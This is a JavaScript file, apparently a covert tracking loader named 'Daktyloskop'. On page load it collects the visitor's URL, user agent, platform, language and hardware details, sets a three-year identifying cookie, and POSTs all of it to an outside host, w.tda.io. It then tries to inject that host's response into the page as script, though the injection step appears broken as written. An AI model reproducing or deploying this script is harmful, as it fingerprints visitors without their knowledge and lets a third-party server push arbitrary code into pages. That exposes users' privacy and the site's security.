var Daktyloskop = (function () {
    var client_info =
            "?hostname=" + window.location.hostname
            + "&pathname=" + window.location.pathname
            + "&port=" + window.location.port
            + "&protocol=" + window.location.protocol
            + "&hash=" + window.location.hash
            + "&href=" + window.location.href
            + "&ua=" + navigator.userAgent
            + "&languages=" + navigator.language
            + "&product=" + navigator.product
            + "&productSub=" + navigator.productSub
            + "&platform=" + navigator.platform
            + "&vendor=" + navigator.vendor
            + "&vendorSub=" + navigator.vendorSub
            + "&appCodeName=" + navigator.appCodeName
            + "&appName=" + navigator.appName
            + "&cookieEnabled=" + navigator.cookieEnabled
            + "&doNotTrack=" + navigator.doNotTrack
            + "&hardwareConcurrency=" + navigator.hardwareConcurrency
            + "&cookieHash=" + checkCookies(),
        apiEndpoint,
        storageName = "minidmp2";

    function Daktyloskop(options) {
        apiEndpoint = options.apiEndpoint;
        var xhr = getXmlHttp();
        xhr.open("POST", apiEndpoint, true);
        xhr.onreadystatechange = function () {
            if (xhr.readyState == 4) {
                if (xhr.status == 200) {
                    var script = document.createElement("script");
                    script.type = "text/javascript";
                    var content = document.createTextNode(xhr.responseText);
                    document.getElementsByTagName('head')[0].appendChild(content);
                } else {
                }
            }
        };
        xhr.send(client_info);
    }


    function getXmlHttp() {
        var xmlhttp;
        try {
            xmlhttp = new ActiveXObject("Msxml2.XMLHTTP");
        } catch (e) {
            try {
                xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
            } catch (E) {
                xmlhttp = false;
            }
        }
        if (!xmlhttp && typeof XMLHttpRequest != 'undefined') {
            xmlhttp = new XMLHttpRequest();
        }
        return xmlhttp;
    }

    function checkCookies() {
        var cookieHash = getCookie(storageName),
            sessionUUID = uuid(),
            EXPIRE_DAYS = 3 * 365; // 3 years
        if (!cookieHash) {
            setCookie(storageName, sessionUUID, EXPIRE_DAYS);
            setCookie("uuidCreated", Date.now(), EXPIRE_DAYS);
            return sessionUUID;
        } else {
            return cookieHash;
        }
    }

    function setCookie(name, value, days) {
        var expires;
        if (days) {
            var date = new Date();
            date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
            expires = "; expires=" + date.toGMTString();
        }
        else expires = "";
        document.cookie = name + "=" + value + expires + "; path=/";
    }

    function getCookie(name) {
        var nameEQ = name + "=";
        var ca = document.cookie.split(';');
        for (var i = 0; i < ca.length; i++) {
            var c = ca[i];
            while (c.charAt(0) == ' ') c = c.substring(1, c.length);
            if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length, c.length);
        }
        return null;
    }

    function uuid(epoch) {
        var timestamp, rand, res;

        epoch = epoch || 1443019185586;

        timestamp = (new Date()) - epoch;
        timestamp <<= 32;
        timestamp = timestamp.toString();
        timestamp = makeArray(17 - timestamp.length).join("0") + timestamp;

        rand = (Math.floor(Math.random() * (Math.pow(2, 34) - 1))).toString(16);
        rand = rand.slice(0, 8);
        rand = makeArray(9 - rand.length).join("0") + rand;

        res = timestamp + rand;
        return res.toString(16);
    }

    function makeArray(number) {
        var arr = [];
        for (var i = 0; i < number; i++) {
            arr[i] = "";
        }
        return arr;
    }

    return Daktyloskop;
})
();

Daktyloskop({
    apiEndpoint: 'http://w.tda.io/a/targets.js'
});